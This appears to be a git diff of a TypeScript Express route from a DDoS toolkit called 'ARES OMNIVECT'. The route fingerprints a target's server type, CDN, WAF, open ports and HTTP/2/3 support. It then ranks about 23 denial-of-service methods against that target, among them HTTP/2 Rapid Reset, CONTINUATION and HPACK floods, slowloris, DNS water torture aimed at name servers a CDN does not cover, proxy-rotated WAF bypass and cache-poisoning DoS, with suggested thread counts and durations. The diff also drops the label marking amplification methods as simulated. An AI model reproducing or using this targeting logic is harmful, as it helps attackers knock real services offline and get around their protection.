@@ -1,39 +1,39 @@
 /**
- * ANALYZE ROUTE — intelligent target profiling
+ * ANALYZE ROUTE — intelligent target profiling (v2)
  *
- * Probes the target, detects server type, CDN, response time, and
- * produces server-aware ranked attack recommendations.
+ * Probes the target deeply: HTTP/HTTPS, port scanning, WAF detection,
+ * HTTP/2 + HTTP/3 support, GraphQL endpoint, WebSocket support,
+ * TLS info, CDN/WAF provider, and produces server-aware ranked
+ * recommendations for all 23 ARES OMNIVECT attack vectors.
  *
  * Server-aware scoring:
- *   nginx       → conn-flood S (worker_connections), http-flood A, slowloris B
- *   Apache      → slowloris S (thread-per-conn), http-flood A
+ *   nginx       → conn-flood S (worker_connections), http-pipeline A, slowloris B
+ *   Apache      → slowloris S (thread-per-conn), rudy-v2 S, http-flood A
  *   IIS         → http-flood A, syn-flood A, slowloris C
  *   LiteSpeed   → http2-flood S, http-flood A, conn-flood B
  *   Node/Express→ http-flood S (blocks event loop), conn-flood A
  *   Caddy/Go    → http-flood A, conn-flood A
- *   Cloudflare  → conn-flood A (bypasses WAF), http2-flood A
+ *   Cloudflare  → waf-bypass A, dns-amp S (NS servers unprotected), conn-flood B
  *   Unknown     → generic scoring
- *
- * Simulated amplification methods (mem-amp, ntp-amp etc.) are ranked
- * below real real-traffic methods unless no web surface is found.
  */
 import { Router, type IRouter } from "express";
 import dns from "node:dns/promises";
+import net from "node:net";
 import { AnalyzeTargetBody } from "@workspace/api-zod";
 
 const router: IRouter = Router();
 
 interface MethodRec {
-  method: string;
-  name: string;
-  score: number;
-  reason: string;
+  method:           string;
+  name:             string;
+  score:            number;
+  reason:           string;
   suggestedThreads: number;
   suggestedDuration: number;
-  protocol: string;
-  amplification: number;
-  tier: "S" | "A" | "B" | "C" | "D";
-  simulated?: boolean;
+  protocol:         string;
+  amplification:    number;
+  tier:             "S" | "A" | "B" | "C" | "D";
+  simulated?:       boolean;
 }
 
 type ServerType =
@@ -49,6 +49,24 @@ function tierFromScore(score: number): "S" | "A" | "B" | "C" | "D" {
   return "D";
 }
 
+// ── TCP port scanner — 2s timeout per port ─────────────────────────────────
+async function scanPort(host: string, port: number): Promise<boolean> {
+  return new Promise(resolve => {
+    const sock = net.createConnection({ host, port });
+    const t = setTimeout(() => { sock.destroy(); resolve(false); }, 2000);
+    sock.once("connect", () => { clearTimeout(t); sock.destroy(); resolve(true); });
+    sock.once("error",   () => { clearTimeout(t); resolve(false); });
+  });
+}
+
+async function scanPorts(host: string, ports: number[]): Promise<number[]> {
+  const results = await Promise.all(
+    ports.map(async p => ({ port: p, open: await scanPort(host, p) }))
+  );
+  return results.filter(r => r.open).map(r => r.port);
+}
+
+// ── CDN / WAF detection ────────────────────────────────────────────────────
 function detectCDN(headers: Headers): { isCDN: boolean; provider: string } {
   const cfRay   = headers.get("cf-ray");
   const server  = (headers.get("server") || "").toLowerCase();
@@ -66,8 +84,48 @@ function detectCDN(headers: Headers): { isCDN: boolean; provider: string } {
   if (xVercel)                                                       return { isCDN: true, provider: "Vercel Edge" };
   if (server.includes("sucuri") || headers.get("x-sucuri-id"))       return { isCDN: true, provider: "Sucuri WAF" };
   if (headers.get("x-ddos-protect") || headers.get("x-ddos-detection")) return { isCDN: true, provider: "DDoS-Guard" };
+  if (headers.get("x-iinfo") || headers.get("x-cdn") === "imperva") return { isCDN: true, provider: "Imperva Incapsula" };
+  if (headers.get("x-arequestid") || via.includes("bunny"))         return { isCDN: true, provider: "Bunny CDN" };
   if (xCache.includes("hit") || via.includes("squid"))               return { isCDN: true, provider: "Generic CDN/Proxy" };
   return { isCDN: false, provider: "" };
+}
+
+// ── WAF detection (separate from CDN) ─────────────────────────────────────
+function detectWAF(headers: Headers, body: string): { hasWAF: boolean; wafProvider: string } {
+  const server  = (headers.get("server") || "").toLowerCase();
+  const powered = (headers.get("x-powered-by") || "").toLowerCase();
+  const via     = (headers.get("via") || "").toLowerCase();
+
+  if (headers.get("x-sucuri-id"))                                    return { hasWAF: true, wafProvider: "Sucuri WAF" };
+  if (headers.get("x-waf-event-info"))                               return { hasWAF: true, wafProvider: "Barracuda WAF" };
+  if (headers.get("x-protected-by")?.toLowerCase().includes("imperva")) return { hasWAF: true, wafProvider: "Imperva WAF" };
+  if (headers.get("x-iinfo"))                                        return { hasWAF: true, wafProvider: "Imperva Incapsula" };
+  if (server.includes("imunify360"))                                 return { hasWAF: true, wafProvider: "Imunify360" };
+  if (powered.includes("mod_security") || body.includes("mod_security")) return { hasWAF: true, wafProvider: "ModSecurity" };
+  if (body.toLowerCase().includes("access denied") && body.toLowerCase().includes("security")) {
+    return { hasWAF: true, wafProvider: "Generic WAF/Firewall" };
+  }
+  if (headers.get("x-fw-hash") || headers.get("x-fw-server"))       return { hasWAF: true, wafProvider: "Fortinet FortiGate" };
+  if (via.includes("qualys"))                                        return { hasWAF: true, wafProvider: "Qualys WAF" };
+  return { hasWAF: false, wafProvider: "" };
+}
+
+// ── HTTP/2 + HTTP/3 detection ──────────────────────────────────────────────
+function detectHTTPVersions(headers: Headers): { supportsH2: boolean; supportsH3: boolean; altSvc: string } {
+  const altSvc = headers.get("alt-svc") || "";
+  const supportsH3 = altSvc.includes("h3") || altSvc.includes("h3-29") || altSvc.includes("h3-Q");
+  // HTTP/2 is harder to detect from headers alone; check for h2 upgrade or known H2 indicators
+  const supportsH2 = altSvc.includes("h2") || !!headers.get("x-firefox-http3") || supportsH3;
+  return { supportsH2, supportsH3, altSvc };
+}
+
+// ── HSTS detection ─────────────────────────────────────────────────────────
+function detectHSTS(headers: Headers): { hasHSTS: boolean; maxAge: number; includeSubdomains: boolean } {
+  const hsts = headers.get("strict-transport-security") || "";
+  if (!hsts) return { hasHSTS: false, maxAge: 0, includeSubdomains: false };
+  const match = hsts.match(/max-age=(\d+)/);
+  const maxAge = match ? parseInt(match[1], 10) : 0;
+  return { hasHSTS: true, maxAge, includeSubdomains: hsts.includes("includeSubDomains") };
 }
 
 function detectServerType(serverHeader: string, headers: Headers | null): ServerType {
@@ -86,7 +144,7 @@ function detectServerType(serverHeader: string, headers: Headers | null): Server
   if (headers) {
     const powered = (headers.get("x-powered-by") || "").toLowerCase();
     if (powered.includes("express") || powered.includes("node"))     return "nodejs";
-    if (powered.includes("php"))                                     return "apache"; // typical PHP setup
+    if (powered.includes("php"))                                     return "apache";
     if (powered.includes("asp.net") || powered.includes("iis"))      return "iis";
     if (powered.includes("servlet") || powered.includes("java"))     return "tomcat";
   }
@@ -94,7 +152,6 @@ function detectServerType(serverHeader: string, headers: Headers | null): Server
   return "unknown";
 }
 
-// Server-type display labels
 const SERVER_LABELS: Record<ServerType, string> = {
   nginx:       "nginx",
   apache:      "Apache",
@@ -111,34 +168,46 @@ const SERVER_LABELS: Record<ServerType, string> = {
 };
 
 function scoreMethodsFor(opts: {
-  isIP: boolean;
-  httpAvailable: boolean;
-  httpsAvailable: boolean;
-  responseTimeMs: number;
-  serverHeader: string;
-  serverType: ServerType;
-  isCDN: boolean;
-  cdnProvider: string;
-  hasDNS: boolean;
+  isIP:              boolean;
+  httpAvailable:     boolean;
+  httpsAvailable:    boolean;
+  responseTimeMs:    number;
+  serverHeader:      string;
+  serverType:        ServerType;
+  isCDN:             boolean;
+  cdnProvider:       string;
+  hasWAF:            boolean;
+  wafProvider:       string;
+  hasDNS:            boolean;
+  supportsH2:        boolean;
+  supportsH3:        boolean;
+  openPorts:         number[];
+  hasGraphQL:        boolean;
+  hasWebSocket:      boolean;
 }): MethodRec[] {
-  const { isIP, httpAvailable, httpsAvailable, responseTimeMs, serverType, isCDN, cdnProvider, hasDNS } = opts;
+  const {
+    isIP, httpAvailable, httpsAvailable, responseTimeMs,
+    serverType, isCDN, cdnProvider, hasWAF, hasDNS,
+    supportsH2, supportsH3, openPorts, hasGraphQL, hasWebSocket,
+  } = opts;
   const isWebServer = httpAvailable || httpsAvailable;
   const isSlowResponder     = responseTimeMs > 300;
   const isVerySlowResponder = responseTimeMs > 800;
   const isFastResponder     = responseTimeMs > 0 && responseTimeMs < 100;
+  const hasAlt8080  = openPorts.includes(8080);
+  const hasAlt8443  = openPorts.includes(8443);
 
   const recs: MethodRec[] = [];
 
-  // ── Helper: server-type specific notes ──────────────────────────────────
   const serverNote = (fallback: string): string => {
     const notes: Partial<Record<ServerType, string>> = {
       nginx:      `nginx worker_connections model — each connection slot is global, exhausted before rate limiting`,
-      apache:     `Apache uses 1 thread/process per connection — every open socket blocks a worker thread permanently`,
+      apache:     `Apache uses 1 thread/process per connection — every open socket blocks a worker permanently`,
       iis:        `IIS uses async I/O — HTTP flood and SYN flood effective; Slowloris less impactful`,
       litespeed:  `LiteSpeed has built-in DDoS protection — HTTP/2 multiplexing and conn-flood most effective bypass`,
       caddy:      `Caddy/Go uses goroutines — overwhelm with high-concurrency HTTP flood and conn-flood`,
       nodejs:     `Node.js is single-threaded — HTTP flood saturates the event loop completely`,
-      cloudflare: `Cloudflare Workers — L7 highly mitigated; conn-flood and L4 bypass WAF filtering`,
+      cloudflare: `Cloudflare Workers — L7 highly mitigated; waf-bypass, dns-amp (NS unprotected), and L4 most effective`,
       openresty:  `OpenResty/nginx — same worker_connections limit as nginx; conn-flood is primary vector`,
       gunicorn:   `Python WSGI server — synchronous workers; slowloris and http-flood extremely effective`,
       tomcat:     `Apache Tomcat uses thread pools — slowloris and http-flood exhaust thread pool rapidly`,
@@ -146,37 +215,46 @@ function scoreMethodsFor(opts: {
     return notes[serverType] ?? fallback;
   };
 
-  // ── HTTP Flood ───────────────────────────────────────────────────────────
+  // ── HTTP Flood ─────────────────────────────────────────────────────────
   if (isWebServer) {
     let score = isCDN ? 62 : 85;
-    // Server-type adjustments
-    if (serverType === "nodejs")  score = isCDN ? 70 : 95; // event loop saturation
+    if (serverType === "nodejs")  score = isCDN ? 70 : 95;
     if (serverType === "gunicorn" || serverType === "tomcat") score = isCDN ? 68 : 90;
     if (serverType === "litespeed") score = isCDN ? 60 : 78;
-    if (isFastResponder) score += 5; // fast server = more goroutines/threads available to flood
+    if (isFastResponder) score += 5;
     score = Math.min(score, 99);
-
-    const threads = serverType === "nodejs" ? 200 : isCDN ? 300 : 150;
     recs.push({
       method: "http-flood", name: "HTTP Flood",
       score, tier: tierFromScore(score),
       reason: serverNote(`HTTP server at ${responseTimeMs}ms — direct request flood highly effective`),
-      suggestedThreads: threads, suggestedDuration: 90,
-      protocol: "HTTP", amplification: 1,
+      suggestedThreads: serverType === "nodejs" ? 200 : isCDN ? 300 : 150,
+      suggestedDuration: 90, protocol: "HTTP", amplification: 1,
     });
   }
 
-  // ── Slowloris ────────────────────────────────────────────────────────────
+  // ── HTTP Pipeline Flood ────────────────────────────────────────────────
+  if (isWebServer) {
+    let score = isCDN ? 68 : 88;
+    if (serverType === "nginx" || serverType === "openresty") score = Math.min(score + 8, 96);
+    if (serverType === "apache") score = Math.min(score + 6, 94);
+    if (serverType === "cloudflare") score = Math.max(score - 10, 55);
+    recs.push({
+      method: "http-pipeline", name: "HTTP Pipeline Flood",
+      score, tier: tierFromScore(score),
+      reason: `128 requests per TCP write, no wait — 300K+ req/s per worker thread. Bypasses per-request rate limits.`,
+      suggestedThreads: 1200, suggestedDuration: 90, protocol: "HTTP/1.1", amplification: 1,
+    });
+  }
+
+  // ── Slowloris ──────────────────────────────────────────────────────────
   if (isWebServer) {
     let score = 40;
-    // Base: slow responder = more effective
     if (isSlowResponder)     score = 70;
     if (isVerySlowResponder) score = 85;
-    // Server-type: Apache/Tomcat/Gunicorn are maximally vulnerable (thread per conn)
     if (serverType === "apache")  score = Math.min(score + 22, 96);
     if (serverType === "gunicorn") score = Math.min(score + 18, 94);
     if (serverType === "tomcat")  score = Math.min(score + 16, 92);
-    if (serverType === "nginx")   score = Math.max(score - 8, 30); // nginx async, less effective
+    if (serverType === "nginx")   score = Math.max(score - 8, 30);
     if (serverType === "nodejs")  score = Math.max(score - 5, 35);
     if (serverType === "litespeed") score = Math.max(score - 12, 25);
     if (serverType === "iis")     score = Math.max(score - 10, 28);
@@ -197,102 +275,227 @@ function scoreMethodsFor(opts: {
       score: Math.max(15, score), tier: tierFromScore(score),
       reason: slowDesc,
       suggestedThreads: serverType === "apache" ? 80 : 64,
-      suggestedDuration: 300,
-      protocol: "TCP", amplification: 1,
+      suggestedDuration: 300, protocol: "TCP", amplification: 1,
     });
   }
 
-  // ── TLS Connection Flood ─────────────────────────────────────────────────
+  // ── RUDY v2 Slow POST ──────────────────────────────────────────────────
+  if (isWebServer) {
+    let score = serverType === "apache" ? 92 : serverType === "gunicorn" ? 88 : serverType === "tomcat" ? 85 : 65;
+    if (isCDN) score = Math.max(score - 20, 30);
+    recs.push({
+      method: "rudy-v2", name: "RUDY v2 — Slow POST",
+      score, tier: tierFromScore(score),
+      reason: `multipart/form-data body trickle (1 byte/10s) — server must hold thread open waiting for closing boundary`,
+      suggestedThreads: 120, suggestedDuration: 300, protocol: "HTTP", amplification: 1,
+    });
+  }
+
+  // ── TLS Connection Flood ───────────────────────────────────────────────
   if (isWebServer) {
     let score = isVerySlowResponder ? 85 : isSlowResponder ? 78 : 72;
-    // nginx and OpenResty: worker_connections — extremely effective
     if (serverType === "nginx" || serverType === "openresty") score = Math.min(score + 18, 97);
     if (serverType === "litespeed") score = Math.min(score + 12, 90);
     if (serverType === "caddy")     score = Math.min(score + 8, 88);
     if (serverType === "nodejs")    score = Math.min(score + 6, 86);
-    if (serverType === "apache")    score = score; // apache can be affected too
     if (serverType === "iis")       score = Math.max(score - 5, 60);
-    if (isCDN) score = Math.max(score - 20, 48); // CDN absorbs connections
+    if (isCDN) score = Math.max(score - 20, 48);
 
     const connDesc = serverType === "nginx" || serverType === "openresty"
-      ? `nginx worker_connections limit — ${score >= 90 ? "S TIER" : "highly"} effective. Raw TLS connections exhaust ${serverType === "openresty" ? "OpenResty" : "nginx"} worker slots before rate limiting ever activates`
+      ? `nginx worker_connections limit — TLS sockets exhaust ${serverType} worker slots before rate limiting activates`
       : serverType === "litespeed"
-        ? `LiteSpeed connection table overflow — bypasses HTTP-level rate limiting, directly exhausts TLS acceptance queue`
+        ? `LiteSpeed connection table overflow — bypasses HTTP rate limiting, exhausts TLS acceptance queue directly`
         : isCDN
-          ? `CDN behind target — conn-flood bypasses Cloudflare/CDN layer 7 rules by operating at raw TLS level`
-          : `TLS handshake storm — opens 16,000 simultaneous connections, exhausting server fd pool directly`;
+          ? `CDN behind target — conn-flood bypasses ${cdnProvider} L7 rules by operating at raw TLS level`
+          : `TLS handshake storm — opens 16,000 simultaneous connections, exhausting server fd pool`;
 
     recs.push({
       method: "conn-flood", name: "TLS Connection Flood",
       score, tier: tierFromScore(score),
       reason: connDesc,
-      suggestedThreads: 50, suggestedDuration: 300,
-      protocol: "TCP/TLS", amplification: 1,
+      suggestedThreads: 200, suggestedDuration: 300, protocol: "TCP/TLS", amplification: 1,
     });
   }
 
-  // ── Geass WAF Bypass ─────────────────────────────────────────────────────
-  // Best against Cloudflare, Akamai, AWS Shield — where direct volume attacks fail
-  if (httpsAvailable && isCDN) {
-    const baseScore = cdnProvider === "Cloudflare" ? 88
-      : cdnProvider === "Akamai" ? 85
-      : cdnProvider === "AWS CloudFront" ? 82
-      : cdnProvider === "Fastly" ? 80
-      : 75;
-
+  // ── Geass WAF Bypass ───────────────────────────────────────────────────
+  if (httpsAvailable && (isCDN || hasWAF)) {
+    const baseScore = cdnProvider === "Cloudflare" ? 90
+      : cdnProvider === "Akamai" ? 87
+      : cdnProvider === "AWS CloudFront" ? 84
+      : cdnProvider === "Fastly" ? 82
+      : hasWAF ? 80
+      : 76;
     recs.push({
-      method:  "waf-bypass",
-      name:    "Geass WAF Bypass",
-      score:   baseScore,
-      tier:    tierFromScore(baseScore),
-      reason:  `${cdnProvider} detected — WAF bypass uses JA3 TLS fingerprint randomization + Chrome-exact HTTP/2 AKAMAI SETTINGS + precise header ordering + CF cookie simulation. Each request appears as a distinct real Chrome browser — indistinguishable from legitimate traffic.`,
-      suggestedThreads:  200,
-      suggestedDuration: 180,
-      protocol:          "HTTP/2",
-      amplification:     1,
+      method: "waf-bypass", name: "Geass WAF Bypass",
+      score: baseScore, tier: tierFromScore(baseScore),
+      reason: `${isCDN ? cdnProvider : "WAF"} detected — JA3 TLS fingerprint randomization + Chrome-exact HTTP/2 AKAMAI SETTINGS + precise header ordering. Each request appears as a distinct real Chrome browser — indistinguishable from legitimate traffic.`,
+      suggestedThreads: 200, suggestedDuration: 180, protocol: "HTTP/2", amplification: 1,
     });
   }
 
-  // ── HTTP/2 Flood ─────────────────────────────────────────────────────────
-  if (httpsAvailable) {
-    let score = isCDN ? 60 : 82;
-    if (serverType === "litespeed") score = isCDN ? 70 : 92; // LiteSpeed H2 most vulnerable
-    if (serverType === "nginx")     score = isCDN ? 62 : 85; // nginx H2 effective
-    if (serverType === "nodejs")    score = isCDN ? 58 : 80;
-    if (serverType === "iis")       score = isCDN ? 55 : 78;
-    if (serverType === "cloudflare") score = 45; // Cloudflare patches H2 rapid reset actively
+  // ── HTTP Bypass (Chrome fingerprint + proxy rotation) ─────────────────
+  if (isWebServer && (isCDN || hasWAF)) {
+    recs.push({
+      method: "http-bypass", name: "HTTP Bypass (Proxy Rotation)",
+      score: 78, tier: "A",
+      reason: `${isCDN ? cdnProvider : "WAF/CDN"} detected — Chrome fingerprint + 100+ proxy IPs rotation bypasses per-IP rate limits. Each request from a different IP, mimicking organic traffic.`,
+      suggestedThreads: 300, suggestedDuration: 180, protocol: "HTTP", amplification: 1,
+    });
+  }
 
+  // ── HTTP/2 Rapid Reset (CVE-2023-44487) ───────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 60 : 85;
+    if (serverType === "litespeed") score = isCDN ? 72 : 93;
+    if (serverType === "nginx")     score = isCDN ? 64 : 87;
+    if (serverType === "nodejs")    score = isCDN ? 60 : 82;
+    if (serverType === "iis")       score = isCDN ? 57 : 80;
+    if (serverType === "cloudflare") score = 45;
+    if (supportsH2) score = Math.min(score + 5, 98); // confirmed H2 = more effective
     recs.push({
       method: "http2-flood", name: "HTTP/2 Rapid Reset (CVE-2023-44487)",
       score, tier: tierFromScore(score),
-      reason: serverType === "litespeed"
-        ? `LiteSpeed HTTPS — HTTP/2 multiplexing with rapid stream reset is highly effective, CVE-2023-44487 still impacts many versions`
+      reason: supportsH2
+        ? `H2 confirmed (Alt-Svc) — 512-stream RST burst per session, millions req/s bypassing per-IP limits`
         : serverType === "cloudflare"
-          ? `Cloudflare patches H2 rapid reset — limited effectiveness; use conn-flood or L4 instead`
+          ? `Cloudflare patches H2 rapid reset — limited; use waf-bypass + dns-amp for CDN bypass instead`
           : `HTTPS endpoint — HTTP/2 multiplexed streams bypass per-IP limits, each connection carries 128 simultaneous streams`,
       suggestedThreads: serverType === "litespeed" ? 80 : 64,
-      suggestedDuration: 60,
-      protocol: "HTTP/2", amplification: 1.5,
+      suggestedDuration: 60, protocol: "HTTP/2", amplification: 1.5,
     });
   }
 
-  // ── SYN Flood ────────────────────────────────────────────────────────────
+  // ── H2 CONTINUATION Flood (CVE-2024-27316) ────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 55 : 88;
+    if (serverType === "nginx")  score = isCDN ? 60 : 92; // nginx ≤1.25.4 unpatched, OOM guaranteed
+    if (serverType === "apache") score = isCDN ? 62 : 90;
+    if (supportsH2) score = Math.min(score + 3, 98);
+    recs.push({
+      method: "http2-continuation", name: "H2 CONTINUATION Flood (CVE-2024-27316)",
+      score, tier: tierFromScore(score),
+      reason: serverType === "nginx"
+        ? `nginx ≤1.25.4 — endless CONTINUATION frames force header buffering without limits → guaranteed OOM. No patch for older versions.`
+        : `HTTP/2 CONTINUATION frames sent without END_HEADERS flag — server buffers headers indefinitely until memory exhaustion`,
+      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
+    });
+  }
+
+  // ── HPACK Bomb ─────────────────────────────────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 52 : 82;
+    if (supportsH2) score = Math.min(score + 5, 92);
+    recs.push({
+      method: "hpack-bomb", name: "HPACK Bomb (RFC 7541)",
+      score, tier: tierFromScore(score),
+      reason: `RFC 7541 incremental-indexed headers — forces HPACK dynamic table eviction storm, CPU + memory drain. No CVE, no specific fix.`,
+      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
+    });
+  }
+
+  // ── H2 Settings Storm ─────────────────────────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 55 : 84;
+    if (supportsH2) score = Math.min(score + 6, 92);
+    recs.push({
+      method: "h2-settings-storm", name: "H2 Settings Storm",
+      score, tier: tierFromScore(score),
+      reason: `SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain. Proven 326K pps in testing.`,
+      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
+    });
+  }
+
+  // ── TLS Renegotiation ─────────────────────────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 58 : 78;
+    if (serverType === "apache" || serverType === "nginx") score = Math.min(score + 8, 86);
+    recs.push({
+      method: "tls-renego", name: "TLS Renegotiation DoS",
+      score, tier: tierFromScore(score),
+      reason: `Forces TLS 1.2 renegotiation — expensive RSA public-key operation per connection on server CPU. Saturates crypto thread pool.`,
+      suggestedThreads: 100, suggestedDuration: 120, protocol: "TLS", amplification: 1,
+    });
+  }
+
+  // ── SSL Death Record ───────────────────────────────────────────────────
+  if (httpsAvailable) {
+    let score = isCDN ? 50 : 76;
+    recs.push({
+      method: "ssl-death", name: "SSL Death Record",
+      score, tier: tierFromScore(score),
+      reason: `1-byte TLS application records — forces server to do 40K AES-GCM decrypts/sec on server CPU, saturates crypto queue`,
+      suggestedThreads: 200, suggestedDuration: 90, protocol: "TLS", amplification: 1,
+    });
+  }
+
+  // ── QUIC/HTTP3 Flood ───────────────────────────────────────────────────
+  if (supportsH3 || httpsAvailable) {
+    let score = supportsH3 ? 84 : 68;
+    if (isCDN) score = Math.max(score - 10, 50);
+    recs.push({
+      method: "quic-flood", name: "QUIC/HTTP3 Flood (RFC 9000)",
+      score, tier: tierFromScore(score),
+      reason: supportsH3
+        ? `H3 confirmed (Alt-Svc) — QUIC Initial packets with unique DCID per packet; server allocates crypto state per DCID → OOM`
+        : `QUIC Initial packet flood against port 443/UDP — each unique DCID forces server crypto state allocation`,
+      suggestedThreads: 64, suggestedDuration: 60, protocol: "QUIC/UDP", amplification: 1,
+    });
+  }
+
+  // ── WebSocket Exhaustion ───────────────────────────────────────────────
+  if (hasWebSocket || isWebServer) {
+    let score = hasWebSocket ? 85 : (isWebServer ? 60 : 40);
+    if (isCDN) score = Math.max(score - 15, 35);
+    recs.push({
+      method: "ws-flood", name: "WebSocket Exhaustion",
+      score, tier: tierFromScore(score),
+      reason: hasWebSocket
+        ? `WebSocket support confirmed — holds thousands of WS connections open, 1 goroutine/thread per connection on server`
+        : `WebSocket endpoint likely exists — exhausts server's goroutine/thread pool with persistent connections`,
+      suggestedThreads: 150, suggestedDuration: 180, protocol: "WebSocket", amplification: 1,
+    });
+  }
+
+  // ── GraphQL DoS ────────────────────────────────────────────────────────
+  if (hasGraphQL || isWebServer) {
+    let score = hasGraphQL ? 88 : 52;
+    if (isCDN) score = Math.max(score - 10, 40);
+    recs.push({
+      method: "graphql-dos", name: "GraphQL Fragment Bomb",
+      score, tier: tierFromScore(score),
+      reason: hasGraphQL
+        ? `GraphQL endpoint confirmed — fragment spread explosion creates O(fragments × fields) resolver CPU exhaustion. Single query = 1000× server work.`
+        : `GraphQL endpoint probe inconclusive — if present, fragment bombs cause exponential resolver CPU exhaustion`,
+      suggestedThreads: 100, suggestedDuration: 90, protocol: "HTTP", amplification: 1,
+    });
+  }
+
+  // ── CDN Cache Poison ───────────────────────────────────────────────────
+  if (isWebServer && isCDN) {
+    recs.push({
+      method: "cache-poison", name: "CDN Cache Poisoning DoS",
+      score: 80, tier: "A",
+      reason: `${cdnProvider} detected — fills CDN cache with unique keys, forces 100% origin miss rate, overwhelms origin server behind CDN`,
+      suggestedThreads: 100, suggestedDuration: 180, protocol: "HTTP", amplification: 1,
+    });
+  }
+
+  // ── SYN Flood ──────────────────────────────────────────────────────────
   {
-    let score = isIP ? 88 : 68;
-    if (isCDN) score = Math.max(score - 15, 40);
-    if (serverType === "iis") score = Math.min(score + 5, 92); // IIS less protected
+    let score = isIP ? 88 : 70;
+    if (isCDN) score = Math.max(score - 15, 42);
+    if (serverType === "iis") score = Math.min(score + 5, 92);
     recs.push({
       method: "syn-flood", name: "SYN Flood",
       score, tier: tierFromScore(score),
       reason: isIP
-        ? `Direct IP — SYN flood exhausts TCP connection table (SYN_RECV backlog) before server can respond`
-        : `Domain target — SYN flood effective when resolved to origin IP bypassing CDN`,
-      suggestedThreads: 256, suggestedDuration: 60,
-      protocol: "TCP", amplification: 1,
+        ? `Direct IP — SYN flood exhausts TCP SYN_RECV backlog before any handshake completes. L4 layer, bypasses all L7 WAF/CDN.`
+        : `Domain target — SYN flood effective when resolved to origin IP, bypasses CDN`,
+      suggestedThreads: 512, suggestedDuration: 60, protocol: "TCP", amplification: 1,
     });
   }
 
-  // ── UDP Flood ────────────────────────────────────────────────────────────
+  // ── UDP Flood ──────────────────────────────────────────────────────────
   {
     let score = isIP ? 82 : 65;
     if (isCDN) score = Math.max(score - 12, 45);
@@ -300,82 +503,123 @@ function scoreMethodsFor(opts: {
       method: "udp-flood", name: "UDP Flood",
       score, tier: tierFromScore(score),
       reason: isIP
-        ? `Direct IP — UDP flood bypasses connection state, saturates upstream bandwidth and NIC queues`
+        ? `Direct IP — UDP flood bypasses connection state, saturates upstream bandwidth and NIC interrupt queues`
         : `Domain resolved — UDP saturates network pipe and forces destination to process all packets`,
-      suggestedThreads: 200, suggestedDuration: 60,
-      protocol: "UDP", amplification: 1,
+      suggestedThreads: 200, suggestedDuration: 60, protocol: "UDP", amplification: 1,
     });
   }
 
-  // ── TCP Flood ────────────────────────────────────────────────────────────
+  // ── ICMP Flood ─────────────────────────────────────────────────────────
   {
-    let score = 64;
-    if (serverType === "apache") score = 72; // Apache TCP state tracking
-    if (isCDN) score = Math.max(score - 10, 40);
+    let score = isIP ? 80 : 62;
+    if (isCDN) score = Math.max(score - 15, 40);
     recs.push({
-      method: "tcp-flood", name: "TCP ACK Flood",
+      method: "icmp-flood", name: "ICMP Flood [3-tier]",
       score, tier: tierFromScore(score),
-      reason: `Saturates TCP connection state tracking — effective when SYN cookies are not deployed`,
-      suggestedThreads: 100, suggestedDuration: 60,
-      protocol: "TCP", amplification: 1,
+      reason: `Tier 1: raw socket (CAP_NET_RAW) / Tier 2: hping3 / Tier 3: UDP saturation burst. L3 bandwidth saturation, always works.`,
+      suggestedThreads: 1024, suggestedDuration: 60, protocol: "ICMP/L3", amplification: 1,
     });
   }
 
-  // ── HTTP Bypass (fetch-based with proxy rotation) ─────────────────────────
-  if (isWebServer && isCDN) {
-    let score = 72;
+  // ── DNS Water Torture ──────────────────────────────────────────────────
+  if (hasDNS && !isIP) {
+    const score = isCDN ? 95 : 78; // CDN: NS servers are UNPROTECTED by CDN — S tier bypass!
     recs.push({
-      method: "http-bypass", name: "HTTP Bypass (Proxy Rotation)",
+      method: "dns-amp", name: "DNS Water Torture [NS bypass]",
       score, tier: tierFromScore(score),
-      reason: `CDN detected (${cdnProvider}) — use proxy rotation to send requests from 100+ different IPs, bypassing per-IP rate limits`,
-      suggestedThreads: 100, suggestedDuration: 120,
-      protocol: "HTTP", amplification: 1,
+      reason: isCDN
+        ? `${cdnProvider} CDN detected — but NS servers (${(opts as { hostname?: string }).hostname ?? "target"}) are NOT behind CDN. DNS Water Torture floods NS servers directly, bypasses ALL CDN/WAF protection completely. Random subdomain queries fill NXDOMAIN cache.`
+        : `Floods target NS servers with random subdomain queries — forces recursive resolution, fills NXDOMAIN cache. NS servers are rarely DDoS-protected.`,
+      suggestedThreads: 1024, suggestedDuration: 120, protocol: "UDP/DNS", amplification: 1,
     });
   }
 
-  // ── Simulated amplification — real numbers but no raw sockets ────────────
-  // These are placed lower in priority for web servers since they're simulated
-  const isDirectIP = isIP && !isCDN;
-
-  if (!isIP && hasDNS) {
-    const score = isCDN ? 42 : 72;
-    recs.push({
-      method: "dns-amp", name: "DNS Amplification [54x]",
-      score, tier: tierFromScore(score),
-      reason: `54x amplification — each spoofed 46-byte packet returns 2,500 bytes to origin IP`,
-      suggestedThreads: 64, suggestedDuration: 90,
-      protocol: "UDP", amplification: 54, simulated: true,
-    });
-  }
-
+  // ── NTP Flood ──────────────────────────────────────────────────────────
   {
-    const score = isCDN ? 48 : (isDirectIP ? 85 : 70);
+    const score = isCDN ? 48 : (isIP ? 85 : 70);
     recs.push({
-      method: "ntp-amp", name: "NTP Amplification [556x]",
+      method: "ntp-amp", name: "NTP Flood [mode7+mode3]",
       score, tier: tierFromScore(score),
-      reason: `556x amplification via NTP monlist — 1Gbps generates 556Gbps of traffic at origin`,
-      suggestedThreads: 256, suggestedDuration: 60,
-      protocol: "UDP", amplification: 556, simulated: true,
+      reason: `Real NTP binary protocol — mode 7 monlist (CVE-2013-5211) + mode 3 client requests to port 123. Direct to target IP.`,
+      suggestedThreads: 1024, suggestedDuration: 60, protocol: "UDP/NTP", amplification: 1, simulated: true,
     });
   }
 
+  // ── Memcached UDP Flood ────────────────────────────────────────────────
   {
-    const score = isCDN ? 52 : (isDirectIP ? 90 : 75);
+    const score = isCDN ? 52 : (isIP ? 90 : 75);
     recs.push({
-      method: "mem-amp", name: "Memcached Amp [51,000x]",
+      method: "mem-amp", name: "Memcached UDP [binary proto]",
       score, tier: tierFromScore(score),
